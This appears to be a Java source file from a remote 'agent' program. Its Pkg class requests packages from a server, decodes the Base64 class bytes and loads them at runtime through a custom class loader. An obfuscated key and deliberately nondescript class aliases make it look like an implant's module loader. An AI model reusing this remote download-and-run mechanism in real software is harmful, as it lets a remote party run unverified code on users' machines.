package agent;

import java.lang.reflect.InvocationTargetException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Hashtable;
import java.util.Set;
import java.util.Arrays;

public class Pkg {
	//package management 
	
	public static void install(String pkgID) throws ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, NoSuchAlgorithmException {
		//packages are pulled by an identifier and received with a name
		//name is the name of the class, with directives passed as <class>.<method> and parsed by name
		//server side the packages are stored by their class names, with a manifest to map ids to names
		Hashtable pkgObject = retrieve(Crypt.distort("distKey") + "." + pkgID);
		String pkgName = pkgObject.get("fileName").toString().split("\\.")[0];
		byte[] pkgObj = Base64.getDecoder().decode(pkgObject.get("fileObj").toString());
		pkgLoader packMan = new pkgLoader();
		packMan.load(pkgObj, pkgName);
	}
	
	
	public static Hashtable retrieve(String collector) throws ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, NoSuchAlgorithmException {
		Hashtable pkgTable = Netw.send("Dist", null, collector, Crypt.bake());
		return pkgTable;
	}
	
	public static void bulk(String[] packages) throws ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, NoSuchAlgorithmException {
		for (int p = 0; p<packages.length; p++) {
			install(packages[p]);
		}
	}
}

class pkgLoader extends ClassLoader {
	public void load(byte[] pkgObject, String pkgName) {
		//load class bytes and map to a nondescript alphabetic alias for the directive
		
		Class defined = defineClass("agent."+pkgName, pkgObject, 0, pkgObject.length);
		Main.dist.put(pkgName, defined);
	}
}
